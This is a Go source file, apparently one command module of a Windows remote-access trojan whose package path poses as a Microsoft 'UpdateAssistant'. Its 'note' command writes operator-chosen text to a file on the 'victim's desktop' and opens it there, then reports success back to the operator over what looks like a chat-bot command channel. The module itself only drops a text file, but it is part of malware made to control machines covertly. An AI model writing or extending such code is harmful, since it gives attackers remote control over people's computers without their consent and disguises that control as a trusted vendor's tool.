//go:build windows

package media

import (
	"fmt"
	"os"
	"path/filepath"
	"time"

	ipc "github.com/microsoft/UpdateAssistant/modules/ipc"
	"github.com/microsoft/UpdateAssistant/modules/sysutil"
)

var noteUsage = []string{
	"note <text> — writes text to a .txt file on the victim's desktop and opens it",
}

func Note(c *ipc.Context) error {
	text := c.ArgString()
	if text == "" {
		return c.Usage(noteUsage)
	}
	go openNote(c, text)
	return nil
}

func openNote(c *ipc.Context, text string) {
	fileName := fmt.Sprintf("note_%s.txt", time.Now().Format("150405"))

	paths := []string{}
	if hd, err := os.UserHomeDir(); err == nil {
		paths = append(paths, filepath.Join(hd, "Desktop"))
	}
	if up := os.Getenv("USERPROFILE"); up != "" {
		paths = append(paths, filepath.Join(up, "Desktop"))
	}
	paths = append(paths, `C:\Users\Public\Desktop`)
	paths = append(paths, os.TempDir())

	var filePath string
	for _, dir := range paths {
		p := filepath.Join(dir, fileName)
		if err := os.MkdirAll(dir, 0755); err != nil {
			continue
		}
		if err := os.WriteFile(p, []byte(text), 0644); err == nil {
			filePath = p
			break
		}
	}

	if filePath == "" {
		c.ReplyEmbed(ipc.Error("Failed to write note — no writable desktop path found"))
		return
	}

	if sysutil.OpenFile(filePath) {
		c.ReplyEmbed(ipc.Success("Successfully opened note on victim's desktop"))
	} else {
		c.ReplyEmbed(ipc.Error("Failed to open Notepad"))
	}
}
